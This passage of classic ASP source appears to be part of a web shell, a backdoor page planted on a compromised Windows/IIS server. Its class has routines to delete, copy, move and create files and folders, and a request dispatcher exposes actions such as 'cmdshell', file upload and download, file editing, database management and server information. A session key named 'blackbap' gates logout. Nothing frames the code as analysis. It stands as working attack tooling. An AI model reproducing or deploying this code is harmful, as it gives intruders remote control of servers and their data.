  path = split(path,"||||")
    if cf.fileexists(path(0)) and path(1)<>"" then
	  cf.movefile path(0),path(1)
      si="<center><br><br><br>文件"&path(0)&"移动成功！</center>"
      si=si&backurl
	  response.write si 
	end if
  end function

  function delfolder(path)
    if cf.folderexists(path) then
	  cf.deletefolder path
      si="<center><br><br><br>目录"&path&"删除成功！</center>"
      si=si&backurl
	  response.write si
	end if
  end function

  function copyfolder(path)
  path = split(path,"||||")
    if cf.folderexists(path(0)) and path(1)<>"" then
	  cf.copyfolder path(0),path(1)
      si="<center><br><br><br>目录"&path(0)&"复制成功！</center>"
      si=si&backurl
	  response.write si
	end if
  end function

  function movefolder(path)
  path = split(path,"||||")
    if cf.folderexists(path(0)) and path(1)<>"" then
	  cf.movefolder path(0),path(1)
      si="<center><br><br><br>目录"&path(0)&"移动成功！</center>"
      si=si&backurl
	  response.write si
	end if
  end function

  function newfolder(path)
    if not cf.folderexists(path) and path<>"" then
	  cf.createfolder path
      si="<center><br><br><br>目录"&path&"新建成功！</center>"
      si=si&backurl
	  response.write si
	end if
  end function
end class


select case action
  case "mainmenu":mainmenu()
  case "showfile"
    set abc=new lbf:abc.showfile(session("folderpath")):set abc=nothing
  case "downfile":downfile fname:showerr()
  case "delfile"
    set abc=new lbf:abc.delfile(fname):set abc=nothing
  case "editfile"
    set abc=new lbf:abc.editfile(fname):set abc=nothing
  case "copyfile"
    set abc=new lbf:abc.copyfile(fname):set abc=nothing
  case "movefile"
    set abc=new lbf:abc.movefile(fname):set abc=nothing
  case "delfolder"
    set abc=new lbf:abc.delfolder(fname):set abc=nothing
  case "copyfolder"
    set abc=new lbf:abc.copyfolder(fname):set abc=nothing
  case "movefolder"
    set abc=new lbf:abc.movefolder(fname):set abc=nothing
  case "newfolder"
    set abc=new lbf:abc.newfolder(fname):set abc=nothing
  case "upfile":upfile()
  case "cmdshell":cmdshell()
  case "logout":session.contents.remove("blackbap"):response.redirect url
  case "createmdb":createmdb fname
  case "compactmdb":compactmdb fname
  case "dbmanager":dbmanager()
  case "course":course()
  case "serverinfo":serverinfo()
  case else mainform()
end select
showerr()
%>